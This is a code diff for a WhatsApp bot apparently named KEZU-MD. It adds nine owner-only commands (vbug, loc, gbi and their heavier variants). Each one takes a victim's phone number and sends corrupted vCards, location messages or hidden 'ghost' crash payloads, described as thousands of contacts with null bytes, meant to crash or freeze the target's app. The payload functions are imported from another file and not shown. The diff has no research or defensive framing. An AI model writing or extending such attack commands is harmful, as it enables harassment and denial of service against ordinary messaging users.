@@ -622,14 +622,23 @@ const _spamTracker = new Map();
 // key: senderJid  →  value: true (attack in progress)
 const _bugAttackActive = new Map();
 
-// ─── CRASH ATTACK HELPERS (from kezu_goodbye.js) ─────────────────────────────
+// ─── CRASH / BUG ATTACK HELPERS (from kezu_goodbye.js) ──────────────────────
 const {
   _atkVvvXxxAaa,
   _atkCrashard,
   _atkCallInvisible,
   _atkForceFreeze,
   _atkBlank1,
-  _atkCombo
+  _atkCombo,
+  _atkVcardBug,
+  _atkVcardBug2,
+  _atkVcardBug3,
+  _atkLocBug,
+  _atkLocBug2,
+  _atkLocBug3,
+  _atkGhostBug,
+  _atkGhostBug2,
+  _atkGhostBug3
 } = require('./kezu_goodbye.js');
 
 // Clean up stale spam tracker entries every 2 minutes to prevent memory leak
@@ -1858,6 +1867,178 @@ function setupCommandHandlers(socket, number) {
           } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
           break;
         }
+
+        // ── vbug (Normal vCard Bug) ──────────────────────────────────────────
+        case 'vbug': {
+          await socket.sendMessage(sender, { react: { text: '💳', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `💳 *VCARD BUG*\n\n*Usage:*\n.vbug <number>\n\n*Example:*\n.vbug 94770000000\n\n*Sends massive corrupted vCard*`
+          }, { quoted: msg });
+          try {
+            const _vNum = args[0].replace(/[^0-9]/g, '');
+            if (_vNum.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _vTarget = _vNum + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `💳 *Target:* ${_vNum}\n⚡ *Sending vCard bug...*` }, { quoted: msg });
+            await _atkVcardBug(socket, _vTarget);
+            await socket.sendMessage(sender, { text: `✅ *vCard bug sent to ${_vNum}*\n\n💳 *KEZU-MD*` }, { quoted: msg });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
+        // ── vbug2 (Heavy vCard Bug) ──────────────────────────────────────────
+        case 'vbug2': {
+          await socket.sendMessage(sender, { react: { text: '💥', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `💥 *HEAVY VCARD BUG*\n\n*Usage:*\n.vbug2 <number>\n\n*Example:*\n.vbug2 94770000000\n\n*Sends 2000+ corrupted contacts*`
+          }, { quoted: msg });
+          try {
+            const _v2Num = args[0].replace(/[^0-9]/g, '');
+            if (_v2Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _v2Target = _v2Num + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `💥 *Target:* ${_v2Num}\n⚡ *Sending heavy vCard attack...*` }, { quoted: msg });
+            await _atkVcardBug(socket, _v2Target); await delay(800);
+            await _atkVcardBug2(socket, _v2Target);
+            await socket.sendMessage(sender, { text: `✅ *Heavy vCard attack done on ${_v2Num}*\n\n💥 *KEZU-MD*` }, { quoted: msg });
+            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
+        // ── vbug3 (Ultimate vCard Bug) ───────────────────────────────────────
+        case 'vbug3': {
+          await socket.sendMessage(sender, { react: { text: '☠️', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `☠️ *ULTIMATE VCARD BUG*\n\n*Usage:*\n.vbug3 <number>\n\n*Example:*\n.vbug3 94770000000\n\n*5000 contacts + max null bytes*`
+          }, { quoted: msg });
+          try {
+            const _v3Num = args[0].replace(/[^0-9]/g, '');
+            if (_v3Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _v3Target = _v3Num + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `☠️ *Target:* ${_v3Num}\n⚡ *ULTIMATE vCard attack initiated...*` }, { quoted: msg });
+            await _atkVcardBug3(socket, _v3Target);
+            await socket.sendMessage(sender, { text: `✅ *ULTIMATE vCard attack done on ${_v3Num}*\n\n☠️ *KEZU-MD MAXIMUM*` }, { quoted: msg });
+            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
+        // ── loc (Normal Location Bug) ────────────────────────────────────────
+        case 'loc': {
+          await socket.sendMessage(sender, { react: { text: '📍', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `📍 *LOCATION BUG*\n\n*Usage:*\n.loc <number>\n\n*Example:*\n.loc 94770000000\n\n*Sends corrupted location message*`
+          }, { quoted: msg });
+          try {
+            const _lNum = args[0].replace(/[^0-9]/g, '');
+            if (_lNum.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _lTarget = _lNum + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `📍 *Target:* ${_lNum}\n⚡ *Sending location bug...*` }, { quoted: msg });
+            await _atkLocBug(socket, _lTarget);
+            await socket.sendMessage(sender, { text: `✅ *Location bug sent to ${_lNum}*\n\n📍 *KEZU-MD*` }, { quoted: msg });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
+        // ── loc2 (Heavy Location Bug) ────────────────────────────────────────
+        case 'loc2': {
+          await socket.sendMessage(sender, { react: { text: '🌍', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `🌍 *HEAVY LOCATION BUG*\n\n*Usage:*\n.loc2 <number>\n\n*Example:*\n.loc2 94770000000\n\n*10 rapid corrupted live locations*`
+          }, { quoted: msg });
+          try {
+            const _l2Num = args[0].replace(/[^0-9]/g, '');
+            if (_l2Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _l2Target = _l2Num + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `🌍 *Target:* ${_l2Num}\n⚡ *Sending heavy location attack...*` }, { quoted: msg });
+            await _atkLocBug(socket, _l2Target); await delay(600);
+            await _atkLocBug2(socket, _l2Target);
+            await socket.sendMessage(sender, { text: `✅ *Heavy location attack done on ${_l2Num}*\n\n🌍 *KEZU-MD*` }, { quoted: msg });
+            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
+        // ── loc3 (Ultimate Location Bug) ─────────────────────────────────────
+        case 'loc3': {
+          await socket.sendMessage(sender, { react: { text: '🗺️', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `🗺️ *ULTIMATE LOCATION BUG*\n\n*Usage:*\n.loc3 <number>\n\n*Example:*\n.loc3 94770000000\n\n*3 rounds + 5x ultra location blast*`
+          }, { quoted: msg });
+          try {
+            const _l3Num = args[0].replace(/[^0-9]/g, '');
+            if (_l3Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _l3Target = _l3Num + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `🗺️ *Target:* ${_l3Num}\n⚡ *ULTIMATE location attack initiated...*` }, { quoted: msg });
+            await _atkLocBug3(socket, _l3Target);
+            await socket.sendMessage(sender, { text: `✅ *ULTIMATE location attack done on ${_l3Num}*\n\n🗺️ *KEZU-MD MAXIMUM*` }, { quoted: msg });
+            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
+        // ── gbi (Ghost/Invisible Bug — appears at target, hidden from sender) ─
+        case 'gbi': {
+          await socket.sendMessage(sender, { react: { text: '👻', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `👻 *GHOST BUG*\n\n*Usage:*\n.gbi <number>\n\n*Example:*\n.gbi 94770000000\n\n*Invisible in sender chat — arrives at target*`
+          }, { quoted: msg });
+          try {
+            const _gNum = args[0].replace(/[^0-9]/g, '');
+            if (_gNum.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _gTarget = _gNum + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `👻 *Target:* ${_gNum}\n⚡ *Sending ghost bug...*` }, { quoted: msg });
+            await _atkGhostBug(socket, _gTarget);
+            await socket.sendMessage(sender, { text: `✅ *Ghost bug sent to ${_gNum}*\n\n👻 *KEZU-MD*` }, { quoted: msg });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
+        // ── gbi2 (Heavy Ghost Bug) ───────────────────────────────────────────
+        case 'gbi2': {
+          await socket.sendMessage(sender, { react: { text: '👁️', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `👁️ *HEAVY GHOST BUG*\n\n*Usage:*\n.gbi2 <number>\n\n*Example:*\n.gbi2 94770000000\n\n*Ghost contacts + invisible crash payloads*`
+          }, { quoted: msg });
+          try {
+            const _g2Num = args[0].replace(/[^0-9]/g, '');
+            if (_g2Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _g2Target = _g2Num + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `👁️ *Target:* ${_g2Num}\n⚡ *Sending heavy ghost attack...*` }, { quoted: msg });
+            await _atkGhostBug(socket, _g2Target); await delay(600);
+            await _atkGhostBug2(socket, _g2Target);
+            await socket.sendMessage(sender, { text: `✅ *Heavy ghost attack done on ${_g2Num}*\n\n👁️ *KEZU-MD*` }, { quoted: msg });
+            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
+        // ── gbi3 (Ultimate Ghost Bug) ────────────────────────────────────────
+        case 'gbi3': {
+          await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `💀 *ULTIMATE GHOST BUG*\n\n*Usage:*\n.gbi3 <number>\n\n*Example:*\n.gbi3 94770000000\n\n*5 rounds — ghost + vCard + loc combo*`
+          }, { quoted: msg });
+          try {
+            const _g3Num = args[0].replace(/[^0-9]/g, '');
+            if (_g3Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _g3Target = _g3Num + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `💀 *Target:* ${_g3Num}\n⚡ *ULTIMATE ghost attack initiated...*\n\n*5 rounds: ghost + vCard + location*` }, { quoted: msg });
+            await _atkGhostBug3(socket, _g3Target);
+            await socket.sendMessage(sender, { text: `✅ *ULTIMATE ghost attack done on ${_g3Num}*\n\n💀 *KEZU-MD MAXIMUM*` }, { quoted: msg });
+            await socket.sendMessage(sender, { react: { text: '👻', key: msg.key } });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
           case 'tourl':
 case 'url':
 case 'upload': {
